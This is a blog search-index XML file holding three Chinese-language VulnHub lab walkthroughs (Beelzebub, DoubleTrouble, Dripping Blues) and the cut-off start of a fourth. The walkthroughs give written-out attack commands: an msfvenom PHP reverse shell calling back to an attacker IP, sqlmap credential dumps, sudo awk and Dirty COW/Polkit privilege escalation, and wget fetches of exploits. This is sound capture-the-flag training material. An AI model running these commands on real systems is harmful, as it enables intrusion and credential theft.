<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>『vulnhub系列』BEELZEBUB- 1</title>
      <link href="/2024/05/27/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FBEELZEBUB-%201/"/>
      <url>/2024/05/27/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FBEELZEBUB-%201/</url>
      
        <content type="html"><![CDATA[<h1>『vulnhub系列』BEELZEBUB- 1</h1><h2 id="下载地址：">下载地址：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/beelzebub-<span class="number">1</span>,<span class="number">742</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集：">信息搜集：</h2><p>使用nmap扫描存活主机，发现主机开启了22和80端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.0</span>.*</span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>访问80端口的web服务，发现是apache的默认页面</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>使用dirsearch扫描目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.140/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>发现存在<code>phpmyadmin</code>等页面，访问<code>index.php</code>页面，发现是<code>404</code> <code>/login</code>也是一样</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>感觉有猫腻，查看一下源代码，果然发现一行提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--My heart was encrypted, <span class="string">&quot;beelzebub&quot;</span> somehow hacked <span class="keyword">and</span> decoded it.-md5--&gt;</span><br><span class="line"><span class="comment">#我的心被加密了，&quot;beelzebub&quot;不知如何被入侵了，并且被解密了 md5</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%204.png" alt="Untitled"></p><p>大概的意思是本来是被加密的，后来被用md5解密了，现在我们使用md5加密一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d18e1e22becbd915b45e0e655429d487</span><br></pre></td></tr></table></figure><p>然后当作目录扫描一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.140/d18e1e22becbd915b45e0e655429d487&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><p>然后我们发现是个<code>Wordpress</code> 网站，里面有登录页面（这里靶机换了ip变为<code>192.168.0.128</code>）</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>还有一个文件上传的目录页面</p><p><img src="Untitled%207.png" alt="Untitled"></p><p>点开<code>Talk To VALAK</code> 发现是个带有输入框的页面</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>随便输入一个数据，查看<code>cookie</code> 多出来一个<code>Password</code> 值为<code>M4k3Ad3a1</code></p><p><img src="Untitled%209.png" alt="Untitled"></p><p>因为是<code>Wordpress</code>页面，因此可以使用工具<code>wpscan</code></p><p>使用命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url=http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.128</span>/d18e1e22becbd915b45e0e655429d487/ --ignore-main-redirect --force -e --plugins-detection aggressive</span><br></pre></td></tr></table></figure><ul><li>–ignore-main-redirect 忽略重定向扫描目标</li><li>–force 不检查是否运行wordpress</li><li>-e --enumerate 枚举，默认枚举所有插件，备份</li><li>–plugins-detection aggressive 使用提供的模式枚举插件 默认被动（passvie）可选：混合（mix）被动（passvie）主动（aggressive）</li></ul><p>扫描到用户<code>valak</code> 和<code>krampus</code> 我们使用这两个用户名和密码<code>M4k3Ad3a1</code>进行登录</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>因为wordpress页面跳转有些问题，我们使用<code>ssh</code>登录，使用<code>krampus</code>登录成功</p><p><img src="Untitled%2011.png" alt="Untitled"></p><h2 id="权限提升：">权限提升：</h2><p>进入系统后，使用命令<code>ls -la</code> 发现有两个文件很可疑</p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>但是<code>.sudo_as_admin_successful</code> 大小为0所以我们直接看<code>.bash_history</code>可以看到命令历史</p><p>然后我们发现有一个<code>wget</code>和<code>gcc</code>编译命令，我们照着运行</p><p><img src="Untitled%2013.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/<span class="number">47009</span></span><br><span class="line"></span><br><span class="line">mv <span class="number">47009</span> ./exploit.c</span><br><span class="line"></span><br><span class="line">gcc exploit.c -o <span class="number">1</span></span><br><span class="line"></span><br><span class="line">./<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2014.png" alt="Untitled"></p><h2 id="成果：">成果：</h2><p><img src="Untitled%2015.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』doubletrouble-1</title>
      <link href="/2024/05/23/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8Fdoubletrouble-1/"/>
      <url>/2024/05/23/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8Fdoubletrouble-1/</url>
      
        <content type="html"><![CDATA[<h1>『vulnhub系列』doubletrouble-1</h1><h2 id="下载地址">下载地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/doubletrouble-<span class="number">1</span>,<span class="number">743</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集">信息搜集</h2><p>使用命令，获得存活靶机IP为138，开启端口22和80</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.0</span>.* <span class="comment">#因为当前NAT模式，攻击机和靶机在一个内网环境中</span></span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>访问80的web服务，是一个登录页面</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>又是qdPm，之前做过一个qdpm的题目，于是我们就知道了qdpm存在密码泄露漏洞。我们来看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit qdpm</span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>我们发现密码泄露漏洞是50176.txt，查看，发现我们可以去<code>http://&lt;website&gt;/core/config/databases.yml</code> 这个目录下，获得数据库的用户名密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m <span class="number">50176.</span>txt <span class="comment">#将50176.txt存到当前目录</span></span><br><span class="line">cat <span class="number">50176.</span>txt</span><br></pre></td></tr></table></figure><p><img src="Untitled%203.png" alt="Untitled"></p><p>访问后，得到用户名：密码— <code>otis</code> :<code>rush</code></p><p><img src="Untitled%204.png" alt="Untitled"></p><p>但我们发现，靶机的3306端口并没有开，继续信息搜集</p><p>使用dirsearch爆破目录，得到如下目录，发现secret目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.138/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><p>访问<code>/secret</code>目录里面都有一个<code>doubletrouble.jpg</code></p><p><img src="Untitled%206.png" alt="Untitled"></p><p>打开图片，发现图片里有我们刚刚获取的用户名和密码Otis：Rush</p><p><img src="Untitled%207.png" alt="Untitled"></p><p>但目前这些信息并没有什么用，因此想到了以前做CTF时候的隐写术，丢到WinHex里并没有发现什么东西，我们搜索jpg相关的隐写术，发现有一种steghide隐写，可以在linux中使用。</p><blockquote><p>Steghide 是一个可用于隐写术的工具。它允许您在音频和图像文件中嵌入秘密信息，包括 JPEG、BMP、WAV 和 AU 文件。 Steghide 允许：</p><ul><li>嵌入数据的加密。</li><li>嵌入数据的压缩。</li><li>嵌入校验和以验证提取的数据的完整性。</li></ul></blockquote><p>我们安装一下，并试一下，发现需要密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install steghide <span class="comment">#安装</span></span><br><span class="line">steghide info doubletrouble.jpg <span class="comment">#查看图片信息</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%208.png" alt="Untitled"></p><p>然后StegHide是隐写工具，现在我们是要破解它隐写后的密码，这里用到了另一个工具：<strong>Stegseek</strong></p><blockquote><p>Stegseek是迄今为止全世界最快的Steghide破解qi，该工具每秒能够处理数百万的密码。虽然Stegseek是一款轻量级工具，但丝毫不影响其功能性的强大。该工具作为原始Steghide项目的一个分支而构建，它的速度比其他破解qi快上千倍。在该工具的帮助下，广大研究人员可以轻松从使用了Steghide隐写&amp;加密的文件中提取出隐藏的数据。</p><p>除此之外，Stegseek还可以用来提取Steghide的元数据，我们可以利用这些信息来判断一个文件中是否包含了Steghide数据。</p><p>值得一提的是，仅需两秒钟，该工具就可以跑完rockyou.txt字典。而众所周知，rockyou.txt是一个包含了超过1400万个密码的强大字典文件。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install stegseek</span><br></pre></td></tr></table></figure><p>然后我们使用<code>/usr/share/wordlist/rockyou.txt.gz</code> 解压后的<code>rockyou.txt</code>来进行暴力破解</p><p>得到密码<code>92camaro</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegseek doubletrouble.jpg rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="Untitled%209.png" alt="Untitled"></p><p>再次查看图片信息，输入密码，发现有一个<code>creds.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info doubletrouble.jpg</span><br></pre></td></tr></table></figure><p><img src="Untitled%2010.png" alt="Untitled"></p><p>分离文件，输入密码，得到<code>creds.txt</code> 查看一下，得到邮箱：密码<code>otisrush@localhost.com:otis666</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf doubletrouble.jpg</span><br><span class="line">cat creds.txt</span><br></pre></td></tr></table></figure><p><img src="Untitled%2011.png" alt="Untitled"></p><p>登录成功</p><p><img src="Untitled%2012.png" alt="Untitled"></p><h2 id="漏洞利用">漏洞利用</h2><p>我们发现可以上传文件</p><p><img src="Untitled%2013.png" alt="Untitled"></p><p>我们使用msf生成一个php反弹木马，上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span> lport=<span class="number">4444</span> -o re_shell.php</span><br></pre></td></tr></table></figure><p><img src="Untitled%2014.png" alt="Untitled"></p><p>上传成功</p><p><img src="Untitled%2015.png" alt="Untitled"></p><p>我们使用msf进行监听,设置<code>options</code>与生成的木马一一对应</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br></pre></td></tr></table></figure><p>然后我们刚刚扫描的时候，发现有一个<code>uploads</code>目录，我们访问一下其下的目录<code>attachments</code></p><p>发现我们刚上传的文件已经上传成功了</p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>我们在攻击机输入<code>run</code>开启监听</p><p><img src="Untitled%2017.png" alt="Untitled"></p><p>访问php文件，反弹成功</p><p><img src="Untitled%2018.png" alt="Untitled"></p><p>现在的权限是网站权限</p><p><img src="Untitled%2019.png" alt="Untitled"></p><h2 id="权限提升：">权限提升：</h2><p>使用<code>py</code>获取交互式<code>shell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2020.png" alt="Untitled"></p><p>使用命令查看带有<code>SUID</code>权限的文件，发现并没有什么东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="Untitled%2021.png" alt="Untitled"></p><p>使用命令查看可以使用<code>root</code>权限执行的命令，发现<code>awk</code>命令可以以<code>root</code>权限执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="Untitled%2022.png" alt="Untitled"></p><p>因此我们可以借助<code>awk</code>进行<code>sudo</code>提权</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>关于<code>sudo</code>提权可以看我之前的文章<a href="https://jo4hua.github.io/2023/03/05/sudo%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83/">sudo滥用提权 | Don_Joshua’s Blog (jo4hua.github.io)</a></p><p>提权成功</p><p><img src="Untitled%2023.png" alt="Untitled"></p><p>进入到root目录……发现……还有一个靶机，将其移动到<code>/var/www/html</code>目录下</p><p><img src="Untitled%2024.png" alt="Untitled"></p><p>输入网址+镜像名，下载，开机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.138</span>/doubletrouble.ova</span><br></pre></td></tr></table></figure><h1>第二层靶机</h1><h2 id="信息搜集：">信息搜集：</h2><p>依旧使用nmap找到存活主机</p><p><img src="Untitled%2025.png" alt="Untitled"></p><p>访问80端口web服务，是一个登录页面</p><p><img src="Untitled%2026.png" alt="Untitled"></p><p>使用之前的<code>otis</code>用户名和密码，登陆失败，没有回显，可能是sql注入？使用<code>sqlmap</code>尝试一下吧</p><h2 id="漏洞利用：">漏洞利用：</h2><p>首先查看源代码，用的是<code>pos</code>t方式传<code>uname,psw</code></p><p><img src="Untitled%2027.png" alt="Untitled"></p><p>使用sqlmap，存在时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span>/index.php --data=<span class="string">&quot;uname=admin&amp;psw=123&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2028.png" alt="Untitled"></p><p>使用命令，得到数据库<code>doubletrouble</code> 另一个是默认表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span>/index.php --data=<span class="string">&quot;uname=admin&amp;psw=123&quot;</span> --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="Untitled%2029.png" alt="Untitled"></p><p>继续爆破表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span>/index.php --data=<span class="string">&quot;uname=admin&amp;psw=123&quot;</span> -D doubletrouble --tables --batch</span><br></pre></td></tr></table></figure><p><img src="Untitled%2030.png" alt="Untitled"></p><p>爆破字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span>/index.php --data=<span class="string">&quot;uname=admin&amp;psw=123&quot;</span> -D doubletrouble -T users --columns --batch</span><br></pre></td></tr></table></figure><p><img src="Untitled%2031.png" alt="Untitled"></p><p>爆破内容，得到用户名密码<code>montreux | GfsZxc1</code>   <code>clapton  | ZubZub99</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span>/index.php --data=<span class="string">&quot;uname=admin&amp;psw=123&quot;</span> -D doubletrouble -T users -C username,password --dump --batch</span><br></pre></td></tr></table></figure><p><img src="Untitled%2032.png" alt="Untitled"></p><p>然后我们登录，发现登录不上，那现在只剩一个地方了</p><p>没错就是<code>ssh</code>了，使用第二个用户和密码登陆成功，获得普通用户权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh clapton@<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2033.png" alt="Untitled"></p><h2 id="权限提升：-2">权限提升：</h2><p>老套路，先查看具有SUID权限的文件,发现一个exim4有些可疑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="Untitled%2034.png" alt="Untitled"></p><p>搜一下，发现可以进行SUID提权，使用命令查看一下版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/exim4 --version</span><br></pre></td></tr></table></figure><p><img src="Untitled%2035.png" alt="Untitled"></p><p>寻找对应版本漏洞，下载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Exim <span class="number">4.80</span></span><br><span class="line">searchsploit -m <span class="number">35951.</span>py</span><br></pre></td></tr></table></figure><p><img src="Untitled%2036.png" alt="Untitled"></p><p>开启apache服务，将exp移动到/var/www/html目录下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">mv <span class="number">35951.</span>py /var/www/html</span><br></pre></td></tr></table></figure><p><img src="Untitled%2037.png" alt="Untitled"></p><p>使用靶机下载exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span>/<span class="number">35951.</span>py</span><br></pre></td></tr></table></figure><p><img src="Untitled%2038.png" alt="Untitled"></p><p>发现这几个exp都不好用</p><p>接下来查看系统内核信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="Untitled%2039.png" alt="Untitled"></p><p>直接上脏牛提权吧，发现我们的内核版本在可利用范围内</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchspolit dirty</span><br></pre></td></tr></table></figure><p><img src="Untitled%2040.png" alt="Untitled"></p><p>重复上述过程，我们将<code>40847.cpp</code>上传到靶机上，赋予执行权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span>/<span class="number">40847.</span>cpp <span class="comment">#靶机下载exp</span></span><br><span class="line"></span><br><span class="line">chmod +x <span class="number">40847.</span>cpp <span class="comment">#赋予运行权限</span></span><br><span class="line"></span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++<span class="number">11</span> -pthread -o <span class="number">1</span> <span class="number">40847.</span>cpp -lutil <span class="comment">#编译一下，输出为1</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2041.png" alt="Untitled"></p><p>运行1，得到root密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./<span class="number">1</span> 运行</span><br></pre></td></tr></table></figure><p><img src="Untitled%2042.png" alt="Untitled"></p><p>使用<code>su</code>切换为<code>root</code>用户，输入密码，获取<code>root</code>权限</p><p><img src="Untitled%2043.png" alt="Untitled"></p><h2 id="成果：">成果：</h2><p>获取普通权限的时候，发现<code>user.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6CEA7A737C7C651F6DA7669109B5FB52</span><br></pre></td></tr></table></figure><p>在<code>root</code>目录下<code>cat root.txt</code>可得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1B8EEA89EA92CECB931E3CC25AA8DE21</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』Dripping-Blues-1</title>
      <link href="/2024/05/22/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FDripping-Blues-1/"/>
      <url>/2024/05/22/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FDripping-Blues-1/</url>
      
        <content type="html"><![CDATA[<h1>『vulnhub系列』Dripping-Blues-1</h1><h2 id="下载地址：">下载地址：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dripping-blues-<span class="number">1</span>,<span class="number">744</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集：">信息搜集：</h2><p>使用nmap进行本地扫描，确定Ip地址为137</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.0</span>.*</span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>访问80端口web服务，有一串文字，意思大概是被攻击了，然后开了个小玩笑</p><p>这个名字可能会有用<code>travisscott &amp; thugger</code></p><p><img src="Untitled%201.png" alt="Untitled"></p><p>使用dirsearch扫描目录，只发现<code>robots.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.137/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>访问<code>robots.txt</code> 发现有一个<code>/dripisreal.txt</code> 和<code>/etc/dripispowerful.html</code> ，我们试着访问一下</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>发现是让我们访问一个歌词网站，并计算其中的“n words”的MD5值，这个值是ssh登录的密码</p><p><img src="Untitled%204.png" alt="Untitled"></p><p><img src="Untitled%205.png" alt="Untitled"></p><p>自己试了一下，我们使用py生成md5值，发现并不行，应该是猜错了，我们继续从别的地方入手</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">67aff0e8f24f431a9f31899e0c18839b</span><br></pre></td></tr></table></figure><h2 id="漏洞利用：">漏洞利用：</h2><p>因为开启了ftp服务，我们可以使用匿名登录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：anonymous</span><br><span class="line">ftp <span class="number">192.168</span><span class="number">.0</span><span class="number">.137</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%206.png" alt="Untitled"></p><p>发现有一个<code>respectmydrip.zip</code> 文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls <span class="comment">#查看当前目录文件</span></span><br><span class="line">get respectmydrip.<span class="built_in">zip</span> <span class="comment">#下载文件</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%207.png" alt="Untitled"></p><p>解压，发现需要密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip respectmydrip.<span class="built_in">zip</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%208.png" alt="Untitled"></p><p>我们可以使用<code>/usr/share/wordist/rockyou.txt.gz</code> 里的字典进行暴力破解</p><p>首先使用<code>gzip -d rockyou.txt.gz</code> 对其进行解压</p><p><img src="Untitled%209.png" alt="Untitled"></p><p>然后我们使用工具<code>fcrackzip</code>来进行暴力破解,得到了密码<code>072528035</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装：apt-get install fcrackzip</span><br><span class="line">命令：fcrackzip -D -p rockyou.txt -u respectmydrip.<span class="built_in">zip</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2010.png" alt="Untitled"></p><p>之后我们进行解压，解压出来两个文件：<code>respectmydrip.txt</code> 和 <code>secret.zip</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip respectmydrip.<span class="built_in">zip</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2011.png" alt="Untitled"></p><p>我们查看一下<code>respectmydrip.txt</code>  文件，获得提示：<code>just focus on &quot;drip”</code></p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>解压一下<code>secret.zip</code> ，发现也有密码，并且没有破解出来</p><p><img src="Untitled%2013.png" alt="Untitled"></p><p>我们回到网页，提示说注意“<code>drip</code>”，并且在<code>robots</code>中还有一个<code>/etc</code>下的文件，可能存在任意文件读取操作，尝试一下，成功。得到，密码：<code>imdrippinbiatch</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.137</span>/index.php?drip=/etc/dripispowerful.html</span><br></pre></td></tr></table></figure><p><img src="Untitled%2014.png" alt="Untitled"></p><p>解压<code>secret.zip</code>试试，不对</p><p><img src="Untitled%2015.png" alt="Untitled"></p><p>那我们想想还有什么地方需要用到密码：没错<code>ssh</code></p><p>使用留言的这两个id：<code>travisscott &amp; thugger</code> 配上密码登录一下试试，成功</p><p><img src="Untitled%2016.png" alt="Untitled"></p><h2 id="权限提升：">权限提升：</h2><p><code>ls</code>一下可以看到<code>user.txt</code> ，然后<code>cat</code>一下获得以下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5C50FC503A2ABE93B4C5EE3425496521</span><br></pre></td></tr></table></figure><p><img src="Untitled%2017.png" alt="Untitled"></p><p>使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p>查看可以具有SUID权限的文件，我们发现有一个<code>/usr/lib/policykit-1/polkit-agent-helper-1</code></p><p><img src="Untitled%2018.png" alt="Untitled"></p><p>这里需要用到github上的Pochttps://github.com/Almorabea/Polkit-exploit</p><p>然后将<code>CVE-2021-3560.py</code> 传到靶机，使用命令，获得Root权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">3560.</span>py</span><br></pre></td></tr></table></figure><p><img src="Untitled%2019.png" alt="Untitled"></p><h2 id="成果：">成果：</h2><p>除了一开始获得的user.txt我们来到root里获得root.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">78CE377EF7F10FF0EDCA63DD60EE63B8</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』ICA1</title>
      <link href="/2024/05/20/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FICA%201/"/>
      <url>/2024/05/20/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FICA%201/</url>
      
